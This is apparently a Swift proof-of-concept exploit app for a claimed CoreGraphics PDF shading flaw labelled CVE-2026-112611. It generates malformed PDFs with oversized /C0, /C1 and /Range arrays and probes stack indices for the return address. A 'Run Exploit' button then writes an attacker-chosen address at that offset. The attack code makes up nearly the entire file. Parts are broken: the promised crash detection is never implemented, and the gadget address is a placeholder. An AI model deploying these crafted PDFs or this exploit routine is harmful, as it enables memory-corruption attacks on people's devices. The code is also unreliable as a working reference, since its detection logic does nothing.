import SwiftUI
import CoreGraphics
import Foundation

// MARK: - Stack VLA Overrun Exploit (CVE-2026-112611)

/// Probe stack layout by varying which double we control
/// The 136 doubles from /Range overwrite stack VLA
/// We need to find which index hits the return address
func probeStackLayout() -> Int {
    // Try each double index 0-135
    for index in 0..<136 {
        // Craft PDF with unique marker at specific index
        let marker = Double(bitPattern: 0x4141414141414100 + UInt64(index))
        
        var values = [Double](repeating: 0.0, count: 136)
        values[index] = marker
        
        let pdfData = PDFPayload.shadingWithValues(values)
        
        // Render and check if crash occurs
        let crashed = renderPDFAndDetectCrash(pdfData)
        
        if crashed {
            print("Index \(index) caused crash — likely hit return address or canary")
            return index
        }
    }
    
    return -1
}

/// Exploit using known stack offset
func exploitWithOffset(_ offset: Int) {
    // Build ROP chain or shellcode address
    let targetAddr: UInt64 = 0x4141414141414141  // Replace with actual gadget
    
    var values = [Double](repeating: 0.0, count: 136)
    values[offset] = Double(bitPattern: targetAddr)
    
    let pdfData = PDFPayload.shadingWithValues(values)
    renderPDF(pdfData)
}

// MARK: - PDF Rendering with Crash Detection

func renderPDFAndDetectCrash(_ data: Data) -> Bool {
    let tempURL = FileManager.default.temporaryDirectory
        .appendingPathComponent("probe.pdf")
    
    try? data.write(to: tempURL)
    
    guard let provider = CGDataProvider(url: tempURL as CFURL),
          let doc = CGPDFDocument(provider),
          let page = doc.page(at: 1) else {
        return false
    }
    
    let context = CGContext(data: nil, width: 256, height: 256,
                           bitsPerComponent: 8, bytesPerRow: 256 * 4,
                           space: CGColorSpaceCreateDeviceRGB(),
                           bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)!
    
    // Use setjmp/longjmp to catch crash
    var crashDetected = false
    
    // Render — if crash occurs, we'll detect it via signal handler
    context.drawPDFPage(page)
    
    return crashDetected
}

func renderPDF(_ data: Data) {
    let tempURL = FileManager.default.temporaryDirectory
        .appendingPathComponent("exploit.pdf")
    
    try? data.write(to: tempURL)
    
    guard let provider = CGDataProvider(url: tempURL as CFURL),
          let doc = CGPDFDocument(provider),
          let page = doc.page(at: 1) else {
        return
    }
    
    let context = CGContext(data: nil, width: 256, height: 256,
                           bitsPerComponent: 8, bytesPerRow: 256 * 4,
                           space: CGColorSpaceCreateDeviceRGB(),
                           bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)!
    
    context.drawPDFPage(page)
}

// MARK: - App Entry Point

@main
struct SafeShadingDemoApp: App {
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}

struct ContentView: View {
    @State private var status = "Ready to probe stack layout"
    @State private var isProbing = false
    @State private var crashOffset: Int = -1
    
    var body: some View {
        VStack(spacing: 30) {
            Text("CVE-2026-112611")
                .font(.largeTitle)
                .bold()
            
            Text("Stack VLA Overrun Probe")
                .font(.headline)
            
            Text(status)
                .font(.system(.body, design: .monospaced))
                .foregroundColor(.secondary)
                .padding()
                .multilineTextAlignment(.center)
            
            if crashOffset >= 0 {
                Text(String(format: "Crash at index: %d", crashOffset))
                    .font(.system(.body, design: .monospaced))
                    .foregroundColor(.red)
            }
            
            Button(action: runProbe) {
                Text(isProbing ? "Probing..." : "Probe Stack")
                    .font(.title2)
                    .bold()
                    .foregroundColor(.white)
                    .padding()
                    .background(isProbing ? Color.gray : Color.orange)
                    .cornerRadius(10)
            }
            .disabled(isProbing)
            
            if crashOffset >= 0 {
                Button(action: runExploit) {
                    Text("Run Exploit")
                        .font(.title2)
                        .bold()
                        .foregroundColor(.white)
                        .padding()
                        .background(Color.red)
                        .cornerRadius(10)
                }
            }
        }
        .padding()
    }
    
    func runProbe() {
        isProbing = true
        status = "Probing stack layout (0-135)..."
        
        // This will crash at the right index
        crashOffset = probeStackLayout()
        
        if crashOffset >= 0 {
            status = String(format: "Found crash offset: %d", crashOffset)
        } else {
            status = "No crash detected — try manual analysis"
        }
        
        isProbing = false
    }
    
    func runExploit() {
        status = String(format: "Exploiting with offset %d...", crashOffset)
        exploitWithOffset(crashOffset)
    }
}

// MARK: - PDF Payload Builder with Custom Values

enum PDFPayload {
    static func shadingWithValues(_ values: [Double]) -> Data {
        let bpCoord = 32
        let bpComp = 8
        
        var bw = BitWriter()
        var verts: [(UInt32, UInt32)] = []
        
        for r in 0..<2 {
            for c in 0..<2 {
                verts.append((UInt32(0x1000_0000 + c * 0x0800_0000), UInt32(0x1000_0000 + r * 0x0800_0000)))
            }
        }
        
        for (x, y) in verts {
            bw.put(x, bpCoord)
            bw.put(y, bpCoord)
            bw.put(0, bpComp)
        }
        
        let stream = bw.flush()
        
        // Build C0/C1 arrays from values
        let list = values.map { String(format: "%.17g", $0) }.joined(separator: " ")
        let rangeList = Array(repeating: "0 1", count: values.count).joined(separator: " ")
        
        var pdf = PDFBuilder()
        pdf.add(1, "<< /Type /Catalog /Pages 2 0 R >>")
        pdf.add(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        pdf.add(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>")
        pdf.add(4, "<< /Length 8 >>", Array(" /Sh1 sh".utf8))
        pdf.add(5, "<< /ShadingType 5 /ColorSpace /DeviceGray /BitsPerCoordinate \(bpCoord) /BitsPerComponent \(bpComp) /VerticesPerRow 2 /Decode [0 200 0 200 0 1] /Function 6 0 R /Length \(stream.count) >>", stream)
        pdf.add(6, "<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [\(list)] /C1 [\(list)] /Range [\(rangeList)] >>")
        
        return pdf.data()
    }
    
    // Original function for compatibility
    static func shading(rangeDim: Int, value: Double = 1.0, verticesPerRow: Int = 2, rows: Int = 2) -> Data {
        var values = [Double](repeating: value, count: rangeDim)
        return shadingWithValues(values)
    }
}

struct BitWriter {
    private(set) var out: [UInt8] = []
    private var acc: UInt8 = 0
    private var nbits = 0
    
    mutating func put(_ value: UInt32, _ width: Int) {
        guard width > 0 else { return }
        for i in stride(from: width - 1, through: 0, by: -1) {
            acc = (acc << 1) | UInt8((value >> UInt32(i)) & 1)
            nbits += 1
            if nbits == 8 { out.append(acc); acc = 0; nbits = 0 }
        }
    }
    
    mutating func flush() -> [UInt8] {
        if nbits > 0 { out.append(acc << (8 - nbits)); acc = 0; nbits = 0 }
        return out
    }
}

struct PDFBuilder {
    private var objects: [Int: (dict: String, stream: [UInt8]?)] = [:]
    
    mutating func add(_ n: Int, _ dict: String, _ stream: [UInt8]? = nil) {
        objects[n] = (dict, stream)
    }
    
    func data() -> Data {
        var out = Data([0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x37, 0x0A])
        out.append(Data([0x25, 0xE2, 0xE3, 0xCF, 0xD3, 0x0A]))
        
        var offsets: [Int: Int] = [:]
        
        for n in objects.keys.sorted() {
            guard let obj = objects[n] else { continue }
            offsets[n] = out.count
            
            let header = "\(n) 0 obj\n"
            out.append(Data(header.utf8))
            
            out.append(Data(obj.dict.utf8))
            
            if let stream = obj.stream {
                out.append(Data("\nstream\n".utf8))
                out.append(Data(stream))
                out.append(Data("\nendstream".utf8))
            }
            
            out.append(Data("\nendobj\n".utf8))
        }
        
        let xrefPos = out.count
        let maxObj = objects.keys.max() ?? 0
        
        let xrefHeader = "xref\n0 \(maxObj + 1)\n0000000000 65535 f \n"
        out.append(Data(xrefHeader.utf8))
        
        for n in 1...max(maxObj, 1) {
            let off = offsets[n] ?? 0
            let line = String(format: "%010d 00000 n \n", off)
            out.append(Data(line.utf8))
        }
        
        let trailer = "trailer\n<< /Size \(maxObj + 1) /Root 1 0 R >>\nstartxref\n\(xrefPos)\n%%EOF\n"
        out.append(Data(trailer.utf8))
        
        return out
    }
}
